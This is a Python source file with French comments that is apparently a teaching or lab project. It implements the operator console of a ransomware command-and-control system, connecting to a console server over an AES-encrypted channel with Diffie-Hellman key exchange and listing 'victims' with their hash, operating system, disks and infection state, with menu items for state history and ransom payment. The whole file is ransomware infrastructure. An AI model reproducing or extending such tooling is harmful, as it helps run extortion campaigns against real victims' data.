from datetime import datetime
import utile.message
import utile.network as network
import utile.security as security
import socket

# Constantes
# IP_SERV_CONSOLE = '192.168.145.222'
IP_SERV_CONSOLE = socket.gethostbyname(socket.gethostname())
PORT_SERV_CONSOLE = 8380

cle_aes = b''

def print_victims_listing(client_socket):
    liste_vict = []

    print("CONSOLE DE CONTRÔLE")
    print("===================")
    print("1) Liste des victimes du ransomware")
    print("2) Historique des états d'une victime")
    print("3) Renseigner le payement de rançon d'une victime")
    print("4) Quitter")

    while True:
        msg_ent = input("Entrez votre message : ")
        if msg_ent == "1":
            msg_ent = 'LIST_VICTIM_REQ'
            cle_aes = security.diffie_hellman_recv_key(client_socket)
            print("Clé" + str(cle_aes))
            msg = security.aes_encrypt(utile.message.set_message('LIST_VICTIM_REQ'), cle_aes)
            print("Message crypté" + str(msg))

            # Envoyer le message au serveur
            network.send_message(client_socket, msg)

            # Recevoir et traiter les réponses du serveur
            confirmation_message = network.receive_message(client_socket)
            confirmation_message = security.aes_decrypt(confirmation_message, cle_aes)
            msg_type = utile.message.get_message_type(confirmation_message)

            print("Confirmation du serveur :", confirmation_message)
            print("Type du message : " + msg_type)

            txt = "LISTING DES VICTIMES DU RANSOMWARE\n"
            txt += "----------------------------------\n"

            # Réception et traitement des données des victimes
            while confirmation_message != 'LIST_VICTIM_END':
                if msg_type == 'LIST_VICTIM_RESP':
                    liste_vict.append(confirmation_message['VICTIM'])  # ID victime

                    # Ajout des informations de la victime à l'affichage du listing
                    txt += (str(confirmation_message['VICTIM']).rjust(4, '0') + " " +
                             str(confirmation_message['HASH'])[-12:] + " " +
                             str(confirmation_message['OS']).ljust(13) +
                             str(confirmation_message['DISKS'])[:13].ljust(14) +
                             str(confirmation_message['STATE']).ljust(11))

                    # Réception de la réponse suivante
                    confirmation_message = network.receive_message(client_socket)
                    print("Messsage suivant :  (crypté)" + str(confirmation_message))
                    print("Clé =" + str(cle_aes))
                    confirmation_message = security.aes_decrypt(confirmation_message, cle_aes)
                    print("Message suivant : " + str(confirmation_message))
                    msg_type = utile.message.get_message_type(confirmation_message)

                if msg_type == 'LIST_VICTIM_END':
                    break

            # Affichage du listing des victimes
            print(txt)
            print("id liste : " + str(liste_vict))

        if msg_ent == "4":
            break

def main():
    # Connexion au serveur de console
    client_socket = network.connect_to_serv(IP_SERV_CONSOLE, PORT_SERV_CONSOLE)
    print("Connexion établie avec le serveur.")

    # Affichage des listings des victimes
    print_victims_listing(client_socket)

    # Fermer la connexion avec le serveur
    client_socket.close()
    print("Connexion fermée.")


if __name__ == '__main__':
    main()
